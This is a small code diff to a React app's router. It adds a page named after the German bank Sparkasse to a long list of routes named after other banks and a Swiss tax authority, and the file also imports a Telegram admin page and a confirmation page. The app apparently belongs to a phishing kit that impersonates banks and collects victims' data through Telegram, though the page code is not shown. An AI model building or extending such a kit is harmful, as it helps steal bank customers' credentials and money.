@@ -73,6 +73,7 @@ import Openbank from "./pages/Openbank.tsx";
 import Consorsbank from "./pages/Consorsbank.tsx";
 import Apobank from "./pages/Apobank.tsx";
 import SpardaBankDe from "./pages/SpardaBankDe.tsx";
+import Sparkasse from "./pages/Sparkasse.tsx";
 
 import Confirmation from "./pages/Confirmation.tsx";
 import AdminTelegram from "./pages/AdminTelegram.tsx";
@@ -244,6 +245,7 @@ const App = () => (
             <Route path="/de/consorsbank" element={<P><Consorsbank /></P>} />
             <Route path="/de/apobank" element={<P><Apobank /></P>} />
             <Route path="/de/sparda-bank" element={<P><SpardaBankDe /></P>} />
+            <Route path="/de/sparkasse" element={<P><Sparkasse /></P>} />
             <Route path="/estv" element={<P><Estv /></P>} />
             <Route path="/estv/confirmation" element={<P><EstvConfirmation /></P>} />
 
